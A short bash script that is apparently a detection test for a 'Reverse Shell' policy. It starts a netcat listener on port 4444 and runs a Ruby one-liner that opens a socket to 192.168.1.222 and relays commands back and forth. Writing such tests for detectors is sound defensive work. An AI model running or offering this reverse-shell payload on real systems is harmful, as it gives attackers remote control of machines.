#!/bin/bash

# Type: Process
# Policy: Reverse Shell
# Execution:Process/ReverseShell.ReverseShellExecuted

nc -lvp 4444
ruby -rsocket -eexit if fork;s=TCPSocket.new(""192.168.1.222"",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd==""exit"";puts s.recv(1000000);end
